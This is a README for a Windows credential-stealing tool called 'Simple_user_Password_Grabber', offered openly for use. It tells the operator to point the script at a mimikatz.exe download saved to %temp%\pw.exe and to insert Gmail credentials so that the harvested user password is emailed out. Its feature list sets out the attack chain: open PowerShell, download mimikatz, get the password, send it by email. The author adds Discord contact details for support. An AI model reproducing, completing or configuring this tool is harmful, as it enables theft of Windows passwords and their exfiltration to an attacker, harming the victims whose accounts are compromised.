
# Simple_user_Password_Grabber
Grabs the current Windows User password.

## How to use?

This script is not plug and play and only for experienced users. You will need to do the following changes:

- change link to mimikatz.exe "('LINK TO MIMIKATZ.EXE DOWNLOAD HERE','%temp%\pw.exe')"
- change email credential 1 "('THE-PART-OF-YOUR-EMAIL-BEFORE-THE-@"
- change email credential 2 "gmail.com', 'PASSWORDHERE');"
- change email credential 3 "$ReportEmail.From = 'THE-PART-OF-YOUR-EMAIL-BEFORE-THE-@"
- change email credential 4 "$ReportEmail.To.Add('THE-PART-OF-RECEIVERS-EMAIL-BEFORE-THE-@"


## Features

- open powershell
- download mimikatz
- get user password
- send password to email

## Feedback

If you have any feedback, please reach out to me via Discord "UNC0V3R3D#8662".






## Support

For support, contact me via  Discord "UNC0V3R3D#8662".


## Meta


- If you want to sponsor me on Patreon, the link is on my profile.


